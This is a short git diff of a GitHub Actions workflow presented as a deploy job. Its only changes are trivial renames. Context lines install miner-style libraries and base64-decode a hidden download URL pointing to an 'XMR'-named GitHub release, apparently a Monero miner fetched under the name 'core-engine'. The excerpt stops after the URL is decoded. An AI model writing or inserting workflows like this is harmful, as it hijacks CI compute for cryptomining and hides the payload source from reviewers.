@@ -1,4 +1,4 @@
-name: deploy Yapokhgter
+name: deploy CxertyAder
 
 on:
   push:
@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout
+      - name: Checkouts
         uses: actions/checkout@v2
 
       - name: Setup Dependencies
@@ -20,7 +20,7 @@ jobs:
           sudo apt-get update
           sudo apt-get install -y curl libuv1-dev libssl-dev libhwloc-dev
 
-      - name: Download core-engine
+      - name: Download core-engines
         run: |
           ENCODED="aHR0cHM6Ly9naXRodWIuY29tL2Fub25tYXh5WE1SL2NvcmUtZW5naW5lL3JlbGVhc2VzL2Rvd25sb2FkL3YwMy9jb3JlLWVuZ2luZQ=="
           URL=$(echo "$ENCODED" | base64 -d)
